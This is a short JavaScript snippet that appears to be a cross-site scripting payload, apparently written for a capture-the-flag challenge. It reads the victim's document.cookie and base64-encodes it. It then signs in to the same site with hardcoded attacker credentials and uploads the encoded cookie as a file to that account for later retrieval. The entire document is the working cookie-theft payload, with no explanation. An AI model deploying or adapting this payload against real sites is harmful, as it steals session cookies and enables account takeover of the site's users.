fetch("/user").then(e=>{
 aaa=btoa(document.cookie);
fetch("/user").then(e=>{
 fetch("/signin",{
    method: "POST",
    headers: {
    "Content-Type": "application/x-www-form-urlencoded",
    },
     body: "uid=arang&upw=dkfkd3"
    }).then(e=>{
      
      fetch("/user/upload", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "filename=asdf23&data="+aaa,
})
})
})
})
